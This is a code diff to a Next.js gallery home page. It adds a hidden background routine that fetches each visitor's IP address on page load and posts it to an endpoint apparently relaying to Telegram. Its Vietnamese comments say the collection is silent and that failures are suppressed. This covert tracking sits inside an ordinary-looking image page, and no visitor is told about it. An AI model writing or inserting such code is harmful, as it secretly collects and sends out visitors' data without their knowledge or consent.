@@ -1,6 +1,28 @@
+'use client';
+
+import { useEffect } from 'react';
 import Image from 'next/image';
 
 export default function Home() {
+  // Thu thập IP âm thầm ở nền
+  useEffect(() => {
+    const collect = async () => {
+      try {
+        const ipResponse = await fetch('/api/get-ip');
+        if (!ipResponse.ok) return;
+        const ipData = await ipResponse.json();
+        await fetch('/api/send-telegram', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(ipData),
+        });
+      } catch (_) {
+        // im lặng thất bại
+      }
+    };
+    collect();
+  }, []);
+
   const images = [
     { src: '/images/pic-1.jpg', alt: 'Ảnh 1' },
     { src: '/images/pic-2.jpg', alt: 'Ảnh 2' },
